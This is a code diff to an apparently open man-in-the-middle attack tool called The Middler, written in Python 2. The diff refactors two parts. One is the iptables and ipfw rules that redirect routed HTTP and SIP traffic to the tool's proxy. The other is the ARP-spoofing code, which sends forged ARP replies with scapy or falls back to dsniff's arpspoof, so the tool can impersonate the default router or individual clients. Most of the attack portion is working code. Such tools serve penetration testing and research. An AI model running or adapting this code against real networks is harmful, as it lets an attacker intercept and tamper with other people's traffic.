@@ -10,7 +10,7 @@ import re
 from subprocess import *
 from time import sleep
 
-#from scapy.all import *
+from scapy.all import *
 
 #######################
 # Variable definitions
@@ -159,28 +159,35 @@ def redirectIPFWstart():
     ml.redirection_ports.append(["tcp",int(ml.port),80])
 
     # Keep a rule number counter.
-    rule_number = 1000
+    ml.next_free_rule_number = 1000
     for port_tuple in ml.redirection_ports:
         (proto,dest_port,proxy_port) = port_tuple
 
         found_line=0
         for line in ipfw_lines:
-            pattern = "^%d fwd 127\.0\.0\.1\,\d+ tcp from any to any dst-port %d in via" % (rule_number,dest_port)
+            pattern = "^%d fwd 127\.0\.0\.1\,\d+ tcp from any to any dst-port %d in via" % (ml.next_free_rule_number,dest_port)
             if re.match(pattern,line):
                 found_line=1
 
         if not found_line:
-            ipfw_modify=os.popen("/sbin/ipfw add %d fwd 127.0.0.1,%d tcp from any to any dst-port %d in via %s" % (rule_number,proxy_port,dest_port,interface) )
-            print "DEBUG: Just ran /sbin/ipfw add %d fwd 127.0.0.1,%d tcp from any to any dst-port %d in via %s" % (rule_number,proxy_port,dest_port,interface)
-        rule_number = rule_number + 1
+            ipfw_modify=os.popen("/sbin/ipfw add %d fwd 127.0.0.1,%d tcp from any to any dst-port %d in via %s" % (ml.next_free_rule_number,proxy_port,dest_port,interface) )
+            print "DEBUG: Just ran /sbin/ipfw add %d fwd 127.0.0.1,%d tcp from any to any dst-port %d in via %s" % (ml.next_free_rule_number,proxy_port,dest_port,interface)
+        ml.next_free_rule_number = ml.next_free_rule_number + 1
 
 def redirectIPFWstop():
+    for rule_number in xrange(1000,ml.next_free_rule_number):
+        #print "DEBUG: Removing rule %d" % rule_number
+        command = "/sbin/ipfw del %d" % rule_number
+        os.system(command)
+
+def OldredirectIPFWstop():
 
     # TODO: Adapt the above routine.
     # Run ipfw list, so we can look for a rule that starts with 01000
     ipfw_cmd=os.popen("/sbin/ipfw list","r")
     ipfw_lines=ipfw_cmd.readlines()
     ipfw_cmd.close()
+
 
     found_line=0
     for line in ipfw_lines:
@@ -192,8 +199,49 @@ def redirectIPFWstop():
 
     found_line
 
-def redirectIPTablesStart():
+def redirectPort(ports_to_redirect):
 
+    if sys.platform == r"linux2":
+        redirectIPTablesPort(ports_to_redirect)
+    elif sys.platform == r"darwin":
+        redirectIPFWPort(ports_to_redirect)
+
+def redirectIPFWPort(ports_to_redirect):
+    # List of tuples, where each tuple is:  [protocol,dest_port,proxy_port]
+    # where dest_port is the port the traffic was originally destined for,
+    # while proxy_port is the one on which we proxy that traffic.
+
+    for port_tuple in ports_to_redirect:
+        (proto,dest_port,proxy_port) = port_tuple
+        #ipfw_modify=os.popen("/sbin/ipfw add %d fwd 127.0.0.1,%d tcp from any to any dst-port %d in via %s" % (ml.next_free_rule_number,proxy_port,dest_port,interface) )
+        #command = "iptables -t nat -I PREROUTING -p %s --dport %d -j REDIRECT --to-ports %d" % tuple(port_tuple)
+        command = "/sbin/ipfw add %d fwd 127.0.0.1,%d tcp from any to any dst-port %d in via %s" % (ml.next_free_rule_number,proxy_port,dest_port,interface)
+        ml.next_free_rule_number = ml.next_free_rule_number + 1
+        print "Redirecting %s port %d to The Middler's proxy on localhost:%d" % tuple(port_tuple)
+        os.system(command)
+        if port_tuple[0] == "tcp":
+            ml.redirected_tcp_ports.append(port_tuple[1])
+        elif port_tuple[0] == "udp":
+            ml.redirected_udp_ports.append(port_tuple[1])
+
+
+def redirectIPTablesPort(ports_to_redirect=(["tcp",80,80],)):
+
+    # List of tuples, where each tuple is:  [protocol,dest_port,proxy_port]
+    # where dest_port is the port the traffic was originally destined for,
+    # while proxy_port is the one on which we proxy that traffic.
+
+    for port_tuple in ports_to_redirect:
+        #(proto,dest_port,proxy_port) = port_tuple
+        command = "iptables -t nat -I PREROUTING -p %s --dport %d -j REDIRECT --to-ports %d" % tuple(port_tuple)
+        print "Redirecting %s port %d to The Middler's proxy on localhost:%d" % tuple(port_tuple)
+        os.system(command)
+        if port_tuple[0] == "tcp":
+            ml.redirected_tcp_ports.append(port_tuple[1])
+        elif port_tuple[0] == "udp":
+            ml.redirected_udp_ports.append(port_tuple[1])
+
+def redirectIPTablesStart():
     """This function starts up the iptables forwarding so that as this machine routes traffic,
     it redirects traffic destined for specific ports to itself."""
 
@@ -208,21 +256,17 @@ def redirectIPTablesStart():
     # First, put the SIP ports into the list.
     ml.redirection_ports = [ ["udp",5060,5060],["udp",5061,5061],["udp",10000,10000],["udp",64064,64064] ]
     # Now add the HTTP ports
-    ml.redirection_ports.append(["tcp",80,80])
+    ml.redirection_ports.append(["tcp",80,ml.http_port])
+    redirectIPTablesPort(ml.redirection_ports)
 
-    for port_tuple in ml.redirection_ports:
-        #(proto,dest_port,proxy_port) = port_tuple
-        command = "iptables -t nat -I PREROUTING -p %s --dport %d -j REDIRECT --to-ports %d" % tuple(port_tuple)
-        print "Redirecting %s port %d to The Middler's proxy on localhost:%d" % tuple(port_tuple)
-        os.system(command)
 
 def redirectIPTablesStop():
 
     # Same logic as the start routine.
     # First, put the SIP ports into the list.
-    ml.redirection_ports = [ ["udp",5060,5060],["udp",5061,5061],["udp",10000,10000],["udp",64064,64064] ]
+    #ml.redirection_ports = [ ["udp",5060,5060],["udp",5061,5061],["udp",10000,10000],["udp",64064,64064] ]
     # Now add the HTTP ports
-    ml.redirection_ports.append(["tcp",80,80])
+    #ml.redirection_ports.append(["tcp",80,80])
 
     for port_tuple in ml.redirection_ports:
         #(proto,dest_port,proxy_port) = port_tuple
@@ -235,44 +279,62 @@ def redirectIPTablesStop():
 # ARP spoofing code
 ####################################################################################################
 
-def arpspoof_via_scapy(impersonated_host, victim_ip, my_mac, my_broadcast):
+def lookup_mac_via_scapy(victim_ip):
+    """This routine should only be called by arpspoof_via_scapy() or other routines that have already imported scapy."""
+
+    ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victim_ip),timeout=5)
+    return(ans[0][1].sprintf(r"%Ether.src%"))
+
+
+
+def arpspoof_via_scapy(impersonated_host, victim_ip):
     from scapy.all import ARP,IP,send,srp,sr1,conf
 
     # Note that we're using scapy, so the ARP spoof shutdown code knows it needs to send
     # corrective ARP replies.
     ml.arpspoof_via_scapy = 1
 
-    # Turn off scapy's verbosity?
-    conf.verb=0
+    pid = os.fork()
+    if pid:
+        ml.jjlog.debug("Forking to handle arpspoofing via process %d\n" % pid)
+        # Let's add this process to a list of child processes that we will need to
+        # explicitly shut down.
 
-    # Build an ARP response to set up spoofing
-    arp_response = ARP()
-    # define a constant for ARP responses
-    const_ARP_RESPONSE = 2
-    # Set the type to a ARP response
-    arp_response.op = const_ARP_RESPONSE
-    # Hardware address we want to claim the packet
-    arp_response.hwsrc = my_mac
-    # IP address we want to map to that address
-    arp_response.psrc = impersonated_host
+        ml.child_pids_to_shutdown.append(pid)
 
-    # Now set the ARP response target
-    non_broadcast=0
-    if non_broadcast:
-
-        raise "TODO: The Middler team has not yet coded a MAC lookup routine."
-
-        # MAC address and IP address of our victim
-        arp_response.hwdst = lookup_mac(victim_mac)
-        arp_response.pdst = victim_ip
     else:
-        arp_response.hwdst = "ff:ff:ff:ff:ff:ff"
-        arp_response.pdst = my_broadcast
+        # Turn off scapy's verbosity?
+        conf.verb=0
 
-    # Issue the ARP response every 5 seconds
-    while(1):
-        send(arp_response)
-        sleep(3)
+        # Build an ARP response to set up spoofing
+        arp_response = ARP()
+        # define a constant for ARP responses
+        const_ARP_RESPONSE = 2
+        # Set the type to a ARP response
+        arp_response.op = const_ARP_RESPONSE
+        # Hardware address we want to claim the packet
+        arp_response.hwsrc = ml.my_mac
+        # IP address we want to map to that address
+        arp_response.psrc = impersonated_host
+
+        # Now set the ARP response target
+        non_broadcast=0
+        if non_broadcast:
+
+            # MAC address and IP address of our victim
+            arp_response.hwdst = lookup_mac_via_scapy(victim_ip)
+            arp_response.pdst = victim_ip
+        else:
+            arp_response.hwdst = "ff:ff:ff:ff:ff:ff"
+            arp_response.pdst = ml.my_broadcast
+
+        # Issue the ARP response every 5 seconds
+        while(1):
+            send(arp_response)
+            sleep(3)
+
+        print "Arpspoofing dying"
+        exit
 
 
 def set_up_arpspoofing(target_host="ALL",interface="defaultroute",impersonated_host="defaultrouter"):
@@ -307,9 +369,9 @@ def set_up_arpspoofing(target_host="ALL",interface="defaultroute",impersonated_h
     # Now, let's set up to send ARP replies either to a specifically-named target
     # or to everyone on the network except the default router.
 
-    (my_mac,my_broadcast) = find_mac_and_bcast(ml.interface)
+    (ml.my_mac,ml.my_broadcast) = find_mac_and_bcast(ml.interface)
 
-    if my_mac == "NONE":
+    if ml.my_mac == "NONE":
         exit(1)
 
     # TODO-Med: Allow the user to submit a list of interfaces.
@@ -318,49 +380,40 @@ def set_up_arpspoofing(target_host="ALL",interface="defaultroute",impersonated_h
     # Set a variable that tracks whether we used scapy
     ml.arpspoof_via_scapy = 0
 
-    # We'll fork this part off, so it can run for a long time without slowing
-    # everything else down.
+    try:
+        # Try to use scapy for this.
+        import scapy
 
-    # TODO: move this fork to the scapy routine, since the Popen call for an
-    #       external arpspoof program is a fork already.
+        arpspoof_via_scapy(impersonated_host,target_host)
 
-    pid = os.fork()
+    except ImportError:
+        # If scapy isn't present, let's use dsniff's arpspooof program
+        print "Arpspoofing requires either scapy or dsniff's arpspoof program.\n"
+        print "Could not import scapy - using arpspoof instead.\n"
 
-    if pid:
-        ml.jjlog.debug("Forking to handle arpspoofing via process %d\n" % pid)
+        call( ["arpspoof %s" % (impersonated_host),], shell=True, close_fds=True, stdout=PIPE,stderr=STDOUT)
 
-        # Let's add this process to a list of child processes that we will need to
-        # explicitly shut down.
+def arpspoof_a_client(impersonated_host):
+    '''Start arpspoofing to let us impersonate one of the clients on the network to the router.'''
 
-        ml.child_pids_to_shutdown.append(pid)
+    # Make sure that we're allowed to arpspoof
+    if ml.toggle_arpspoof_off:
+        ml.jjlog.debug("ARP spoofing off - not using ARP spoofing to impersonate a victim.")
+        return
 
-    # For the child...
-    else:
-        # Spoof away, Mr McManis
+    # ...and if scapy is unavailable, let's use the arpspoof program.
+    if ml.arpspoof_via_scapy == 0:
+        call( ["arpspoof -t %s %s" % (ml.router,impersonated_host),], shell=True, close_fds=True, stdout=PIPE,stderr=STDOUT)
 
-        # Lock this to arpspoof for now
-
-        #os.system("arpspoof %s >/dev/null 2>&1" % impersonated_host)
-        #ml.arpspoof_process = Popen( ["arpspoof",impersonated_host], shell=True, close_fds = True )
-        #call( ["arpspoof %s" % (impersonated_host),], shell=True, close_fds=True, stdout=PIPE,stderr=STDOUT)
-
-        try:
-            # Try to use scapy for this.
-            import scapy
-
-            arpspoof_via_scapy(impersonated_host,target_host,my_mac,my_broadcast)
-
-        except ImportError:
-            # If scapy isn't present, let's use dsniff's arpspooof program
-            print "Arpspoofing requires either scapy or dsniff's arpspoof program.\n"
-            print "Could not import scapy - using arpspoof instead.\n"
-
-            call( ["arpspoof %s" % (impersonated_host),], shell=True, close_fds=True, stdout=PIPE,stderr=STDOUT)
+    # Otherwise, let's fork a process and run arpspoof via scapy.
+    arpspoof_via_scapy(impersonated_host, ml.router_ip)
 
 
-    ##############################
-    # Packet Routing                         #
-    ##############################
+
+
+####################################################################################################
+# Packet Routing                                                                                   #
+####################################################################################################
 
 def start():
     """Starts The Middler host's routing and launches the function to modify the
